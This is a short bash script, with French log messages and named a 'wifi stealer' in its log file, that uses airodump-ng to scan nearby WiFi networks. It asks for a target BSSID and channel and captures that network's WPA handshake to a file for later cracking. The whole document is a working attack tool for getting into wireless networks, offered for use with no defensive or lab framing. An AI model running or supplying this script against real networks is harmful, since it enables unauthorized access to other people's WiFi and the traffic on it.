#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/wifi_stealer.log"
mkdir -p "$LOG_DIR"

log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $1" | tee -a "$LOG_FILE"
}

CONFIG_FILE="$SCRIPT_DIR/config.json"
WIFI_IFACE=$(jq -r '.wifi_interface' "$CONFIG_FILE")

log "[🔍] Scan des réseaux en cours..."
airodump-ng --output-format pcap -w "$LOG_DIR/handshake" "$WIFI_IFACE" &
SCAN_PID=$!
sleep 10
kill $SCAN_PID

read -p "📡 Entrez le BSSID cible : " TARGET_BSSID
read -p "📡 Entrez le canal cible : " TARGET_CHANNEL

iw dev "$WIFI_IFACE" set channel "$TARGET_CHANNEL"

log "[⚡] Capture du handshake WPA en cours..."
airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CHANNEL" --write "$LOG_DIR/handshake" "$WIFI_IFACE"

log "[✅] Capture terminée, fichier stocké dans $LOG_DIR/handshake.cap"
